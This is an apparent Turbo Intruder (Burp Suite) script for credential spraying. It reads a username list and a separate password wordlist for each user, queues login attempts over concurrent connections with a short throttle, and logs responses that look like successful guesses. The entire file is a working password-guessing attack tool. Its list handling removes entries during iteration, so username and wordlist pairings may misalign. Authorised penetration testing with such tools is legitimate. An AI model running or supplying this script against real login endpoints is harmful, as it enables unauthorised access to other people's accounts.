# Author: https://github.com/abiwaddell
# Credential spraying with one wordlist per username.
# Full description at https://github.com/abiwaddell/Pinwheel
import time


# Parameters to configure
throttleMillisecs=200

def loadFile(filename):
    with open(filename) as f:
        lines = f.readlines()
    return [x.strip() for x in lines]

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           pipeline=False,
                           engine=Engine.BURP
                           )

    for i in range(3,8):
        engine.queue(target.req, randstr(i), learn=1)
        engine.queue(target.req, target.baseInput, learn=2)

    users=loadFile('users.txt')

    lists = []
    for i in range(1,len(users)+1):
        filename='words'+str(i)+'.txt'
        words=loadFile(filename)
        lists.append(words)

    while lists:
        i=0
        for list in lists:
            if list:
                time.sleep(throttleMillisecs/1000)
                engine.queue(target.req, [users[i],list[0]])
                list.remove(list[0])
            else:
                lists.remove(list)
                users.remove(users[i])
            i+=1


def handleResponse(req, interesting):
    if interesting:
        table.add(req)